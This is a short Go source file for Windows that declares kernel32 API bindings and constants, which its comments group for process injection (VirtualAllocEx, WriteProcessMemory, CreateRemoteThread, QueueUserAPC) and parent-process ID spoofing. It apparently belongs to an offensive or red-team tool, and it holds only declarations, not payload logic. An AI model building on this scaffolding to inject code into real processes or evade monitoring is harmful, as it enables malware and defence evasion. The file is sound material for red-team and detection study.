//go:build windows

package main

import "golang.org/x/sys/windows"

// Windows memory/access constants not in the x/sys/windows package
const (
	memCommit            uint32 = 0x1000
	memReserve           uint32 = 0x2000
	memRelease           uint32 = 0x8000
	pageExecuteReadWrite uint32 = 0x40
	processAllAccess     uint32 = 0x1F0FFF
	threadAllAccess      uint32 = 0x1F03FF
	th32csSnapThread     uint32 = 0x00000004

	// PPID spoofing
	extendedStartupInfoPresent       uint32  = 0x00080000
	procThreadAttributeParentProcess uintptr = 0x00020000
	createNewConsole                 uint32  = 0x00000010
)

var (
	modKernel32 = windows.NewLazySystemDLL("kernel32.dll")

	// Injection
	procVirtualAllocEx     = modKernel32.NewProc("VirtualAllocEx")
	procVirtualFreeEx      = modKernel32.NewProc("VirtualFreeEx")
	procWriteProcessMemory = modKernel32.NewProc("WriteProcessMemory")
	procCreateRemoteThread = modKernel32.NewProc("CreateRemoteThread")
	procQueueUserAPC       = modKernel32.NewProc("QueueUserAPC")
	procOpenThread         = modKernel32.NewProc("OpenThread")

	// Thread enumeration
	procCreateToolhelp32Snapshot = modKernel32.NewProc("CreateToolhelp32Snapshot")
	procThread32First            = modKernel32.NewProc("Thread32First")
	procThread32Next             = modKernel32.NewProc("Thread32Next")

	// PPID spoofing
	procInitializeProcThreadAttributeList = modKernel32.NewProc("InitializeProcThreadAttributeList")
	procUpdateProcThreadAttribute         = modKernel32.NewProc("UpdateProcThreadAttribute")
	procDeleteProcThreadAttributeList     = modKernel32.NewProc("DeleteProcThreadAttributeList")
)
